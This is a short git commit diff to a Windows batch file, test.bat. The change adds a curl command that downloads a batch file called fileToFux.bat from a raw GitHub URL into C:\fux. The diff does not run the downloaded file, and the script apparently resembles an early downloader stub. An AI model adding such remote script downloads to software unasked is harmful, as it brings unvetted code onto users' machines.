86d6a013e248f6312e59a7492861bdd91750c813
BelliniGauss <118434152+BelliniGauss@users.noreply.github.com>
2023-12-28 15:53:23 +0100

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,2 +1,10 @@
 @echo test test
 if not exist "C:\fux" md "C:\fux"
+
+set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat
+
+set ZIP_PATH=C:\fux\fileToFux.bat
+
+set DESTINATION_FOLDER=C:\fux
+
+curl -L -o "%ZIP_PATH%" "%URL%"
